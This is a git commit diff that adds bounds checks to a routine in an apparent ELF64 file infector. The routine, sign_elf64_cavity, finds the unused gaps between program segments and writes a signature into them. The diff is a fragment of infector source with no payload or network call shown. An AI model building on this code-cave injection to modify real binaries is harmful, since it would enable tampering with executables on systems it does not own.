c11413dfc7dc8322583cc1153e7084866b5f5532
ebonutto <elio.bonutto@gmail.com>
2026-09-25 13:37:37 +0200

    fix: handling overflows & underflows correctly

--- src/infect/64/infect.c
+++ src/infect/64/infect.c
@@ -26,6 +26,11 @@ int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
 	uint64_t cave_start, cave_end;
 
 	for (uint32_t i = 0; i < elf64->ehdr->e_phnum; i++) {
+		if (elf64->phdr[i].p_offset > file->size)
+			continue ;
+		if (elf64->phdr[i].p_filesz > file->size - elf64->phdr[i].p_offset)
+			continue ;
+
 		cave_start = elf64->phdr[i].p_offset + elf64->phdr[i].p_filesz;
 		cave_end = elf64_find_next_segment(elf64->phdr, elf64->ehdr->e_phnum, i);
 
@@ -35,7 +40,7 @@ int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
 			continue ;
 		if (cave_end - cave_start < SIGNATURE_SIZE)
 			continue ;
-		if (cave_start + SIGNATURE_SIZE > file->size)
+		if (SIGNATURE_SIZE > file->size - cave_start)
 			continue ;
 
 		memcpy(file->map + cave_start, SIGNATURE, SIGNATURE_SIZE);
